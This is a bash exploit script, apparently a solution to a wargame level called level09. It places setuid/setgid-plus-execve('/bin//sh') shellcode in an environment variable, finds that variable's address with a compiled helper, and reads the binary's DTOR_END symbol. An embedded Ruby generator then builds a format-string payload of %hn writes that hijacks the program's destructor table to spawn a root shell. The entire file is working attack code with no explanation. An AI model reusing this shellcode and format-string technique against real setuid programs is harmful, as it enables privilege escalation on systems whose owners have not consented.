#!/bin/bash
cat > env.c << EOF
#include <stdio.h>
#include <string.h>

int main(int ac, char *av[])
{
    char *ptr;
    ptr = (char *)getenv("S");
    ptr += ((strlen(av[0]) - strlen("/levels/level09"))*2);
    printf("%p\n",ptr);
    return 0;
}
EOF

export S=`ruby -e 'print "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"'`

gcc -o env env.c
addr=`./env |cut -d 'x' -f2`
rm -f env env.c

dtor=`nm /levels/level09 |grep DTOR_END |cut -d ' ' -f1`

cat > format.rb << EOF
a = ARGV[0]
o1 = a[0,4].to_i(16) - 8
o2 = a[4,8].to_i(16) - a[0,4].to_i(16)

b = ARGV[1]
c = []
(0...b.length).step(2) do |n|
    c.push b[n]+b[n+1]
end
e = 1
c.reverse.each do |c|
    if e == 1
        e = 0
        c = (c.to_i(16) + 2).to_s(16)
    end
    print c.to_i(16).chr
end
c.reverse.each do |c|
    print c.to_i(16).chr
end
print "%#{o1}x%4\$hn%#{o2}x%5\$hn"
EOF

buf=`ruby format.rb "$addr" "$dtor"`
rm -f format.rb

/levels/level09 "$buf"
